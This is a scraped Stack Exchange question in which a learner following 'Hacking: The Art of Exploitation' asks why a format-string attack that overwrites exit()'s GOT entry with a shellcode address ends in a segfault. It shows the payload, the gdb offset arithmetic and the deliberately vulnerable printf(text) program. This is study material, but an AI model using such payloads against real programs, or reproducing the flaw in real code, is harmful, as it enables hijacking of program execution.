{
    "title": "Overwriting the Global Offset Table + format string vulnerability",
    "link": "https://reverseengineering.stackexchange.com/questions/31484/overwriting-the-global-offset-table-format-string-vulnerability",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I am trying to understand how to overwrite the Global Offset Table. On the book \"Hacking: The Art of Exploitation\". Following the example I get:</p>\n<pre><code>objdump  -R ./fmt                                                                           \n                                                                                                                    \n./fmt:     file format elf32-i386                                                                                   \n                                                                                                                    \nDYNAMIC RELOCATION RECORDS                                                                                          \nOFFSET   TYPE              VALUE                                                                                    \n08049ffc R_386_GLOB_DAT    __gmon_start__                                                                           \n0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0                                                                         \n0804a010 R_386_JUMP_SLOT   exit@GLIBC_2.0                                                                           \n0804a014 R_386_JUMP_SLOT   strlen@GLIBC_2.0                                                                         \n0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0                                                              \n0804a01c R_386_JUMP_SLOT   snprintf@GLIBC_2.0   \n</code></pre>\n<p>The book says that if the jump instruction used for the exit() function can be manipulated to direct the execution flow into shellcode instead of the exit() function, the shell will be spawned.</p>\n<p>For my program, the actual address of the exit(), stored as a pointer at\nthe memory address is : <strong>0x0804a010</strong>.</p>\n<p>Then the shellcode is stored in an environment variable and its actual location (e.g <strong>0xbffffe28</strong> ) is used to calculate <code>&lt;var1&gt; &lt;var2&gt;</code> for the following exploit:</p>\n<pre><code>\\x12\\xa0\\x04\\x08\\x10\\xa0\\x04\\x08%&lt;val1&gt;x%4$hn%&lt;val2&gt;x%5$hn\n</code></pre>\n<p>so</p>\n<pre><code>$ gdb -q\n(gdb) p 0xbfff - 8\n$1 = 49143\n(gdb) p 0xfe28 - 0xbfff                                                                                             \n$2 = 15913\n(gdb) quit\n</code></pre>\n<p>Now, when I run the \"exploit\" I get :</p>\n<pre><code>$ ./fmt $(printf \"\\x12\\xa0\\x04\\x08\\x10\\xa0\\x04\\x08\")%49143x%4\\$hn%15913x%5\\$hn             \nSegmentation fault (core dumped) \n</code></pre>\n<p>Could anyone please advise me on what I am doing wrong or missing?\nWhy the address of the shellcode is not written into the address of the exit() function?\nThank you</p>\n</div>",
    "votes": "2",
    "answers": 0,
    "views": "220",
    "tags": [
        "exploit",
        "buffer-overflow",
        "shellcode",
        "got"
    ],
    "user": "LianoQ",
    "time": "Jan 28, 2023 at 17:44",
    "comments": [
        {
            "user": "0xC0000022L",
            "text": "<span class=\"comment-copy\">Could you please make the file in question available or link to it, if it is provided somewhere already. Thanks.</span>",
            "time": null
        },
        {
            "user": "LianoQ",
            "text": "<span class=\"comment-copy\">Hi, do you mean the source code or the actual file?</span>",
            "time": null
        },
        {
            "user": "0xC0000022L",
            "text": "<span class=\"comment-copy\">I assumed there was no source, but if there are both, then both. As I wrote: links will work just fine, too.</span>",
            "time": null
        },
        {
            "user": "LianoQ",
            "text": "<span class=\"comment-copy\">Ok, here the code : <code>#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main(int argc, char *argv[]) { char text[1024]; static int test_val = -72; if(argc &lt; 2) { printf(\"Usage: %s &lt;text to print&gt;\\n\", argv[0]); exit(0); } strcpy(text, argv[1]); printf(\"The right way to print user-controlled input:\\n\"); printf(\"%s\", text); printf(\"\\nThe wrong way to print user-controlled input:\\n\"); printf(text); printf(\"\\n\"); // Debug output printf(\"[*] test_val @ 0x%08x = %d 0x%08x\\n\", &amp;test_val, test_val, test_val);</code></span>",
            "time": null
        }
    ],
    "answers_data": []
}